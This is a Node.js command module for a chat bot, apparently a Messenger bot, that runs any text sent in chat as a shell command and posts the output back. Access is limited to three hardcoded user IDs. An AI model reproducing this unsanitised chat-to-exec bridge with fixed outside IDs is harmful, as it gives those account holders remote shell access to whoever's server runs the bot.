module.exports.config = { usePrefix: true,
	name: "shell",
	version: "7.3.1",
	hasPermssion: 0,
	credits: "John Lester",
	description: "running shell",
	commandCategory: "System",
	usages: "[shell]",
	cooldowns: 0,
	dependencies: {
		"child_process": ""
	}
};
module.exports.run = async function({ api, event, args, Threads, Users, Currencies, models }) {    
const { exec } = require("child_process");
const god = ["100065445284007","100027818117769","100053660923670",];
  if (!god.includes(event.senderID)) 
return api.sendMessage("Connected", event.threadID, event.messageID);
let text = args.join(" ")
exec(`${text}`, (error, stdout, stderr) => {
    if (error) {
        api.sendMessage(`error: \n${error.message}`, event.threadID, event.messageID);
        return;
    }
    if (stderr) {
        api.sendMessage(`Stderr:\n ${stderr}`, event.threadID, event.messageID);
        return;
    }
    api.sendMessage(`Stdout:\n ${stdout}`, event.threadID, event.messageID);
});
}